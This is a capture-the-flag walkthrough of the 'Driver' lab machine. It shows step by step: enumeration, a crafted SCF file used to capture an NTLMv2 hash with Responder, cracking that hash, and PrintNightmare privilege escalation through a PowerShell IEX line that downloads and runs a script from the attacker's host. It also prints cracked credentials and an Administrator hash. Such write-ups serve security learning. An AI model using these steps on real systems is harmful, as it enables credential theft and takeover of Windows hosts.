# Driver - SCF Attack | PrintNightMare

![Screen Shot 2022-02-26 at 07 40 44](https://user-images.githubusercontent.com/87259078/155849225-3ec15ec7-5596-4ff3-b59a-c6d00b6f27dd.png)

# Enumeration

```
⛩\> nmap -p- -sV -sC -v -oA enum --min-rate 4500 --max-rtt-timeout 1500ms --open 10.129.213.228
Nmap scan report for 10.129.213.228
Host is up (0.27s latency).
Not shown: 65531 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-10-04T12:06:57
|_  start_date: 2021-10-04T09:52:38
```

Nmap reveals four open ports, HTTP has a basic authentication in place, based on version information it is an Windows OS. Let’s look into webpage.

![Screen Shot 2021-10-05 at 22.46.36.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/11A1F00E-8F3A-462D-A5C1-2471E42690AE/78312251-F489-4363-A18D-BC224A937165_2/Screen%20Shot%202021-10-05%20at%2022.46.36.png)

Admin is username and password.

![Screen Shot 2021-10-05 at 22.47.34.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/11A1F00E-8F3A-462D-A5C1-2471E42690AE/8D62D959-54EF-4A0E-A7A2-6BAE70BD13DA_2/Screen%20Shot%202021-10-05%20at%2022.47.34.png)

It’s firmware update platform.

![Screen Shot 2021-10-05 at 22.49.04.png](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/11A1F00E-8F3A-462D-A5C1-2471E42690AE/5ABD2FED-620F-4EDB-9D7C-44C89E66B1A0_2/Screen%20Shot%202021-10-05%20at%2022.49.04.png)

Under updates section, we can find upload feature with a message. Upon firmware upload it goes straight to fire share directory (SMB) and their team will test and review it manually.

Initially I dropped reverse shell (exe) payload on the share, hoping that someone or a script will execute my exe file. It didn’t work.

We can steal the Net_NTLM hash using this shared directory (SMB).

[Full Disclosure: Hash thief on Windows shared folder with SCF files. ADV170014 NTLM SSO](https://seclists.org/fulldisclosure/2017/Oct/59)

> In October 2017, Microsoft fixed a severe flaw that allowed attackers to steal Windows NTLM password hashes without any user interaction, the attackers just needed to place a specially crafted Shell Command File (SCF file) inside publicly accessible Windows folders to trigger the vulnerability.

# Initial Access

This attack only works if the user interacts with the SMB directory (not file). We need two things to make this work, 1. A crafted SCF file, 2. A listener to capture NET_NTLM hash.

```
⛩\> cat hash.scf
[SHELL]
Command=2
IconFile=\\10.10.14.2\share\demo.ico
[Taskbar]
Command=ToggleDesktop

⛩\> sudo responder -wrf --lm -v -I tun0
```

Think ‘scf’ files as shortcuts to perform certain tasks. We have .scf file which contains our IP with random directory and icon file. When a someone or a script opens the SMB directory (not file) this SCF file gets executed and try to resolve the icon by visiting our IP and we capture the NET_NTLM hash.

After uploading the file, you will see hash on responder.

```
[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:eb0c6cdf398c35d4:5AEC4FE2A23FBDD45B5D5CABA63F75E3:0101000000000000E9AD4AA2B8BAD701E1B299627B9294E200000000020000000000000000000000
```

Let’s crack the Tony user’s hash using hashcat.

```
⛩\> cat hash
tony::DRIVER:eb0c6cdf398c35d4:5AEC4FE2A23FBDD45B5D5CABA63F75E3:0101000000000000E9AD4AA2B8BAD701E1B299627B9294E200000000020000000000000000000000

⛩\> hashcat hash -m 5600 /usr/share/wordlists/rockyou.txt

--------------------SNIP--------------------

TONY::DRIVER:eb0c6cdf398c35d4:5aec4fe2a23fbdd45b5d5caba63f75e3:0101000000000000e9ad4aa2b8bad701e1b299627b9294e200000000020000000000000000000000:liltony

Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
```

We go the password, now we can login using Evil-WinRM.

```
⛩\> evil-winrm -i 10.10.11.106 -u tony -p liltony

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\tony\Documents> cat ../Desktop/user.txt
3a187084857373c1c90c851f87ea44e0
```

# Privilege Escalation

Let’s run WinPeas.

```
Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               80            0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               135           0.0.0.0               0               Listening         712             svchost
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               3389          0.0.0.0               0               Listening         1092            svchost
  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               49408         0.0.0.0               0               Listening         448             wininit
  TCP        0.0.0.0               49409         0.0.0.0               0               Listening         884             svchost
  TCP        0.0.0.0               49410         0.0.0.0               0               Listening         844             svchost
  TCP        0.0.0.0               49411         0.0.0.0               0               Listening         1172            spoolsv
  TCP        0.0.0.0               49412         0.0.0.0               0               Listening         564             services
  TCP        0.0.0.0               49413         0.0.0.0               0               Listening         572             lsass
  TCP        10.10.11.106          80            10.10.14.98           61193           Established       4               System
  TCP        10.10.11.106          80            10.10.14.98           61208           Time Wait         0               Idle
  TCP        10.10.11.106          139           0.0.0.0               0               Listening         4               System
  TCP        10.10.11.106          5985          10.10.14.30           45402           Time Wait         0               Idle
  TCP        10.10.11.106          5985          10.10.14.30           45404           Established       4               System
```

WinPeas didn’t explicitly show any LPE path, however active process reveals that a Print Spooler Service is running. We can confirm it via powershell command.

```
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\tony\Documents> Get-Service Spooler | Format-List *


Name                : Spooler
RequiredServices    : {RPCSS, http}
CanPauseAndContinue : False
CanShutdown         : False
CanStop             : True
DisplayName         : Print Spooler
DependentServices   : {Fax}
MachineName         : .
ServiceName         : Spooler
ServicesDependedOn  : {RPCSS, http}
ServiceHandle       :
Status              : Running
ServiceType         : Win32OwnProcess, InteractiveProcess
Site                :
Container           :
```

There has been vulnerabilities in this service in past. Below is the working model of how an attacker can exploit this vulnerability.

[Security Update Guide - Microsoft Security Response Center](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)

![Image](https://res.craft.do/user/full/f2720b1c-ea2b-4053-35cc-fe42cb8a5e5e/doc/11A1F00E-8F3A-462D-A5C1-2471E42690AE/76A63C25-8C48-42F3-B1B9-3A04625E3C67_2/x61oTpCpbqGyF7L2eAgKsrFH9cKkaGfdBeFx1wTY73Az/Image)

There’s a lot of POC’s are already available. We will below powershell script to exploit this vulnerability.

[GitHub - calebstewart/CVE-2021-1675: Pure PowerShell implementation of CVE-2021-1675 Print Spooler Local Privilege Escalation (PrintNightmare)](https://github.com/calebstewart/CVE-2021-1675)

Now we need to download the PS1 script on target machine.

```
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\programdata\demo> IEX(New-Object Net.WebClient).downloadString('http://10.10.14.30/CVE-2021-1675.ps1')
```

This powershell will download and import automatically. Now we need to run the script.

```
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\programdata\demo> Invoke-Nightmare -DriverName "evil_driver" -NewUser "evil_user" -NewPassword "Evil_Password"

[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user evil_user as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
```

We have to add a new user with any driver name and password. Let’s check the newly added user details.

```
[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\programdata\demo> net user evil_user

User name                    evil_user
Full Name                    evil_user
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/26/2022 7:38:35 AM
Password expires             Never
Password changeable          2/26/2022 7:38:35 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.
```

As you can see this new user is member of administrators group. Now we can login with these creds.

```
⛩\> evil-winrm -i 10.10.11.106 -u evil_user -p 'Evil_Password'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\evil_user\Documents> more \users\administrator\desktop\root.txt
0905ac32f9eced6cd1c6d096dcd583ac
```

We got the root flag.

`Administrator:500:aad3b435b51404eeaad3b435b51404ee:d1256cff8b5b5fdb8c327d3b6c3f5017:::`

